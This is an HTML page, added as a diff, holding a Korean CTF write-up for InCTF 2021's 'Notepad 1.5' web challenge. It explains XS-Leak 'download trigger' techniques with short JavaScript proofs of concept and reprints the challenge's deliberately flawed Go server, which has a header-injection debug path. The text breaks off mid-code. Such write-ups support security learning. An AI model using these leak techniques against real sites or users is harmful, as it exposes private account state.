@@ -1,0 +1,564 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="Jeongwon Jo" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      InCTF 2021 Notepad 1.5 - Arthur&#39;s Article Write Up 
+      
+      
+      |
+    
+     Jeongwon Jo
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+    
+<link rel="stylesheet" href="/css/figcaption/mac-block.css">
+
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Pocas</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="https://pocas.kr">
+          <a target="_blank" rel="noopener" href="https://pocas.kr">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">InCTF 2021 Notepad 1.5 - Arthur's Article Write Up</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2021-08-16 23:29:53
+        </span>
+        
+      </div>
+      <div class="markdown-body">
+        <h3 id="What-is-Download-Trigger"><a href="#What-is-Download-Trigger" class="headerlink" title="What is Download Trigger?"></a>What is Download Trigger?</h3><p><img src="https://user-images.githubusercontent.com/49112423/129486098-81fcc315-0f12-4cd5-a414-e09bb8238e71.png" alt="image"></p>
+<p>엔드포인트에서 <code>Content-Disposition: attachment</code> 헤더가 설정이 되면 브라우저는 응답을 하는 대신에 다운로드 할 파일을 탐색한다고 합니다. 특정 상황에 따라서 사용자의 계정 상태 및 여러 요소들에 따라서 달라지는 경우를 이용해서 중요 정보를 수집할 수 있습니다.</p>
+<p><img src="https://user-images.githubusercontent.com/49112423/129486089-6b3179ed-13c5-4545-b8cf-2e957797d8ca.png" alt="image"><br><img src="https://user-images.githubusercontent.com/49112423/129486161-316cf985-49e8-4f94-aa13-567cd166e523.png" alt="image"></p>
+<p>Download Trigger 기법 중 첫 번째 방식은 크로니움 기반 브라우저에서 파일을 다운로드 하게 되면 위와 같이 브라우저 하단에 다운로드 한 파일의 미리 보기가 나타나는 것을 이용하는 것 입니다. 파일이 다운로드 될 때와, 다운로드가 되지 않을 때의 창 높낮이를 이용해서 정보를 유추하는 방식입니다. </p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> screenHeight = <span class="variable language_">window</span>.<span class="property">innerHeight</span>;</span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;https://github.com/wjddnjs33/Exploit/archive/refs/heads/main.zip&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">innerHeight</span> &lt; screenHeight) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Download bar detected&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Download bar not detected&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;, <span class="number">2000</span>);</span><br></pre></td></tr></table></figure>
+<p>POC는 위와 같습니다. </p>
+<p><img src="https://user-images.githubusercontent.com/49112423/129486249-b6607571-d727-4d57-b127-12556efa3d7c.png" alt="image"></p>
+<p>정상적으로 파일이 다운로드 되었을 때 입니다.</p>
+<p><img src="https://user-images.githubusercontent.com/49112423/129486284-a012c229-51dd-4203-8697-3b9dfa912bcb.png" alt="image"></p>
+<p>파일이 다운로드 되지 않았을 때 입니다.</p>
+<p>정상적으로 파일이 다운로드가 되었을 때는, 브라우저 하단에 생성된 창에 의해서 기본의 창에 크기보다 작아 졌기 때문에 다운로드 바가 탐지 되어 다고 출력이 되고, 되지 않았을 때는 창의 크기가 그대로이므로 다운로드 바가 탐지 되지 않았다고 출력 되는 것을 볼 수 있습니다. </p>
+<p><img src="https://user-images.githubusercontent.com/49112423/129486501-7caca57c-97ae-4eb2-a7fa-57f9c472bd1d.png" alt="image"></p>
+<p>두 번째 방식은 iframe을 이용해서 첨부 파일 탐색이 되었을 때, iframe이 교차 출처로 되는 것을 이용해서 판단하는 기법입니다. </p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> url = <span class="string">&#x27;https://github.com/wjddnjs33/Exploit/archive/refs/heads/main.zip&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> iframe = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;iframe&#x27;</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(iframe);</span><br><span class="line"></span><br><span class="line">iframe.<span class="property">srcdoc</span> = <span class="string">`&lt;iframe src=&quot;<span class="subst">$&#123;url&#125;</span>&quot; &gt;&lt;/iframe&gt;`</span>;</span><br><span class="line">iframe.<span class="property">onload</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">          iframe.<span class="property">contentWindow</span>.<span class="property">frames</span>[<span class="number">0</span>].<span class="property">origin</span>;</span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Download attempt detected&#x27;</span>);</span><br><span class="line">      &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;No download attempt detected&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>POC는 위와 같습니다. </p>
+<p><img src="https://user-images.githubusercontent.com/49112423/129486548-895bce61-2348-4f3b-aef6-bb4780540b1a.png" alt="image"></p>
+<p>세 번째 방식은 두 번째 방식과 원리는 동일 하지만 iframe을 사용하지 않고 트리거 하는 방식 입니다. </p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> url = <span class="string">&#x27;https://example.org&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> win = <span class="variable language_">window</span>.<span class="title function_">open</span>(url);</span><br><span class="line"></span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="comment">// If a navigation occurs, the iframe will be cross-origin,</span></span><br><span class="line">          <span class="comment">// so accessing &quot;win.origin&quot; will throw an exception</span></span><br><span class="line">          win.<span class="property">origin</span>;</span><br><span class="line">          parent.<span class="property">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Download attempt detected&#x27;</span>);</span><br><span class="line">      &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">          parent.<span class="property">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;No download attempt detected&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">&#125;, <span class="number">2000</span>);</span><br></pre></td></tr></table></figure>
+<p>POC는 위와 같습니다. </p>
+<hr>
+<h3 id="Exploit-Web-InCTF-2021-Notepad-1-5-Arthur’s-Article-900-pts"><a href="#Exploit-Web-InCTF-2021-Notepad-1-5-Arthur’s-Article-900-pts" class="headerlink" title="Exploit (Web) InCTF 2021 - Notepad 1.5 - Arthur’s Article [900 pts]"></a>Exploit (Web) InCTF 2021 - Notepad 1.5 - Arthur’s Article [900 pts]</h3><blockquote>
+<p>Notepad 1.5 - Arthur’s Article 문제는 XS-Leak을 이용하여 플래그를 획득하는 문제 입니다.</p>
+</blockquote>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;crypto/md5&quot;</span></span><br><span class="line">	<span class="string">&quot;encoding/hex&quot;</span></span><br><span class="line">	<span class="string">&quot;flag&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;html&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;math/rand&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="string">&quot;regexp&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/gorilla/handlers&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/gorilla/mux&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> adminID = <span class="string">&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;</span></span><br><span class="line"><span class="keyword">const</span> adminNOTE = <span class="string">&quot;inctf&#123;flag&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Notes = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Prevent XSS on api-endpoints ¬‿¬</span></span><br><span class="line"><span class="keyword">var</span> cType = <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span>&#123;</span><br><span class="line">	<span class="string">&quot;Content-Type&quot;</span>:            <span class="string">&quot;text/plain&quot;</span>,</span><br><span class="line">	<span class="string">&quot;x-content-type-options&quot;</span>:  <span class="string">&quot;nosniff&quot;</span>,</span><br><span class="line">	<span class="string">&quot;X-Frame-Options&quot;</span>:         <span class="string">&quot;DENY&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Content-Security-Policy&quot;</span>: <span class="string">&quot;default-src &#x27;none&#x27;;&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">cookGenerator</span><span class="params">()</span></span> <span class="type">string</span> &#123;</span><br><span class="line">	hash := md5.Sum([]<span class="type">byte</span>(<span class="type">string</span>(rand.Intn(<span class="number">30</span>))))</span><br><span class="line">	<span class="keyword">return</span> hex.EncodeToString((hash)[:])</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">headerSetter</span><span class="params">(w http.ResponseWriter, header <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span>)</span></span> &#123;</span><br><span class="line">	<span class="keyword">for</span> k, v := <span class="keyword">range</span> header &#123;</span><br><span class="line">		w.Header().Set(k, v)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getIDFromCooke</span><span class="params">(r *http.Request, w http.ResponseWriter)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">	<span class="keyword">var</span> cooke, err = r.Cookie(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">	re := regexp.MustCompile(<span class="string">&quot;^[a-zA-Z0-9]+$&quot;</span>)</span><br><span class="line">	<span class="keyword">var</span> cookeval <span class="type">string</span></span><br><span class="line">	<span class="keyword">if</span> err == <span class="literal">nil</span> &amp;&amp; re.MatchString(cooke.Value) &amp;&amp; <span class="built_in">len</span>(cooke.Value) &lt;= <span class="number">35</span> &amp;&amp; <span class="built_in">len</span>(cooke.Value) &gt;= <span class="number">30</span> &#123;</span><br><span class="line">		cookeval = cooke.Value</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		cookeval = cookGenerator()</span><br><span class="line">		c := http.Cookie&#123;</span><br><span class="line">			Name:     <span class="string">&quot;id&quot;</span>,</span><br><span class="line">			Value:    cookeval,</span><br><span class="line">			SameSite: <span class="number">2</span>,</span><br><span class="line">			HttpOnly: <span class="literal">true</span>,</span><br><span class="line">			Secure:   <span class="literal">false</span>,</span><br><span class="line">		&#125;</span><br><span class="line">		http.SetCookie(w, &amp;c)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> cookeval</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">add</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line"></span><br><span class="line">	id := getIDFromCooke(r, w)</span><br><span class="line">	<span class="keyword">if</span> id != adminID &#123;</span><br><span class="line">		r.ParseForm()</span><br><span class="line">		noteConte := r.Form.Get(<span class="string">&quot;content&quot;</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">len</span>(noteConte) &lt; <span class="number">75</span> &#123;</span><br><span class="line">			Notes[id] = noteConte</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Fprintf(w, <span class="string">&quot;OK&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">get</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	id := getIDFromCooke(r, w)</span><br><span class="line">	x := Notes[id]</span><br><span class="line">	headerSetter(w, cType)</span><br><span class="line">	<span class="keyword">if</span> x == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		fmt.Fprintf(w, <span class="string">&quot;404 No Note Found&quot;</span>)</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> regexp.MustCompile(<span class="string">&quot;&lt;[a-zA-Z0-9]&quot;</span>).MatchString(x) &#123;</span><br><span class="line">		fmt.Fprintf(w, html.EscapeString(x))</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		fmt.Fprintf(w, x)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">find</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line"></span><br><span class="line">	id := getIDFromCooke(r, w)</span><br><span class="line"></span><br><span class="line">	param := r.URL.Query()</span><br><span class="line">	x := Notes[id]</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> which <span class="type">string</span></span><br><span class="line">	str, err := param[<span class="string">&quot;condition&quot;</span>]</span><br><span class="line">	<span class="keyword">if</span> !err &#123;</span><br><span class="line">		which = <span class="string">&quot;any&quot;</span></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		which = str[<span class="number">0</span>]</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> start <span class="type">bool</span></span><br><span class="line">	str, err = param[<span class="string">&quot;startsWith&quot;</span>]</span><br><span class="line">	<span class="keyword">if</span> !err &#123;</span><br><span class="line">		start = strings.HasPrefix(x, <span class="string">&quot;arthur&quot;</span>)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		start = strings.HasPrefix(x, str[<span class="number">0</span>])</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">var</span> responseee <span class="type">string</span></span><br><span class="line">	<span class="keyword">var</span> end <span class="type">bool</span></span><br><span class="line">	str, err = param[<span class="string">&quot;endsWith&quot;</span>]</span><br><span class="line">	<span class="keyword">if</span> !err &#123;</span><br><span class="line">		end = strings.HasSuffix(x, <span class="string">&quot;morgan&quot;</span>)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		end = strings.HasSuffix(x, str[<span class="number">0</span>])</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> which == <span class="string">&quot;starts&quot;</span> &amp;&amp; start &#123;</span><br><span class="line">		responseee = x</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> which == <span class="string">&quot;ends&quot;</span> &amp;&amp; end &#123;</span><br><span class="line">		responseee = x</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> which == <span class="string">&quot;both&quot;</span> &amp;&amp; (start &amp;&amp; end) &#123;</span><br><span class="line">		responseee = x</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> which == <span class="string">&quot;any&quot;</span> &amp;&amp; (start || end) &#123;</span><br><span class="line">		responseee = x</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		_, present := param[<span class="string">&quot;debug&quot;</span>]</span><br><span class="line">		<span class="keyword">if</span> present &#123;</span><br><span class="line">			<span class="built_in">delete</span>(param, <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">			<span class="built_in">delete</span>(param, <span class="string">&quot;startsWith&quot;</span>)</span><br><span class="line">			<span class="built_in">delete</span>(param, <span class="string">&quot;endsWith&quot;</span>)</span><br><span class="line">			<span class="built_in">delete</span>(param, <span class="string">&quot;condition&quot;</span>)</span><br><span class="line"></span><br><span class="line">			<span class="keyword">for</span> v, d := <span class="keyword">range</span> param &#123;</span><br><span class="line">				<span class="keyword">for</span> _, k := <span class="keyword">range</span> d &#123;</span><br><span class="line"></span><br><span class="line">					<span class="keyword">if</span> regexp.MustCompile(<span class="string">&quot;^[a-zA-Z0-9&#123;&#125;_;-]*$&quot;</span>).MatchString(k) &amp;&amp; <span class="built_in">len</span>(d) &lt; <span class="number">5</span> &#123;</span><br><span class="line">						w.Header().Set(v, k)</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		responseee = <span class="string">&quot;404 No Note Found&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line">	headerSetter(w, cType)</span><br><span class="line">	fmt.Fprintf(w, responseee)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Reset notes every 30 mins.  No Vuln in this</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">resetNotes</span><span class="params">()</span></span> &#123;</span><br><span class="line">	Notes[adminID] = adminNOTE</span><br><span class="line">	<span class="keyword">for</span> <span class="keyword">range</span> time.Tick(time.Second * <span class="number">1</span> * <span class="number">60</span> * <span class="number">30</span>) &#123;</span><br><span class="line">		Notes = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span>)</span><br><span class="line">		Notes[adminID] = adminNOTE</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	rand.Seed(time.Now().UnixNano())</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> dir <span class="type">string</span></span><br><span class="line">	flag.StringVar(&amp;dir, <span class="string">&quot;dir&quot;</span>, <span class="string">&quot;./public&quot;</span>, <span class="string">&quot;the directory to serve files from. Defaults to the current dir&quot;</span>)</span><br><span class="line">	flag.Parse()</span><br><span class="line">	<span class="keyword">go</span> resetNotes()</span><br><span class="line">	r := mux.NewRouter()</span><br><span class="line">	s := r.Host(<span class="string">&quot;chall.notepad15.gq:1515&quot;</span>).Subrouter()</span><br><span class="line">	s.HandleFunc(<span class="string">&quot;/add&quot;</span>, add).Methods(<span class="string">&quot;POST&quot;</span>)</span><br><span class="line">	s.HandleFunc(<span class="string">&quot;/get&quot;</span>, get).Methods(<span class="string">&quot;GET&quot;</span>)</span><br><span class="line">	s.HandleFunc(<span class="string">&quot;/find&quot;</span>, find).Methods(<span class="string">&quot;GET&quot;</span>)</span><br><span class="line">	s.PathPrefix(<span class="string">&quot;/&quot;</span>).Handler(http.StripPrefix(<span class="string">&quot;/&quot;</span>, http.FileServer(http.Dir(dir))))</span><br><span class="line">	fmt.Println(<span class="string">&quot;Server started at http://0.0.0.0:3000&quot;</span>)</span><br><span class="line">	loggedRouter := handlers.LoggingHandler(os.Stdout, r)</span><br><span class="line">	srv := &amp;http.Server&#123;</span><br><span class="line">		Addr: <span class="string">&quot;0.0.0.0:3000&quot;</span>,</span><br><span class="line">		<span class="comment">// Good practice to set timeouts to avoid Slowloris attacks.</span></span><br><span class="line">		WriteTimeout: time.Second * <span class="number">15</span>,</span><br><span class="line">		ReadTimeout:  time.Second * <span class="number">15</span>,</span><br><span class="line">		IdleTimeout:  time.Second * <span class="number">60</span>,</span><br><span class="line">		Handler:      loggedRouter, <span class="comment">// Pass our instance of gorilla/mux in.</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> err := srv.ListenAndServe(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Println(err)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>해당 문제의 서버는 <code>Go</code>라는 프로그래밍 언어로 작성이 되어 있습니다.</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	rand.Seed(time.Now().UnixNano())</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> dir <span class="type">string</span></span><br><span class="line">	flag.StringVar(&amp;dir, <span class="string">&quot;dir&quot;</span>, <span class="string">&quot;./public&quot;</span>, <span class="string">&quot;the directory to serve files from. Defaults to the current dir&quot;</span>)</span><br><span class="line">	flag.Parse()</span><br><span class="line">	<span class="keyword">go</span> resetNotes()</span><br><span class="line">	r := mux.NewRouter()</span><br><span class="line">	s := r.Host(<span class="string">&quot;chall.notepad15.gq:1515&quot;</span>).Subrouter()</span><br><span class="line">	s.HandleFunc(<span class="string">&quot;/add&quot;</span>, add).Methods(<span 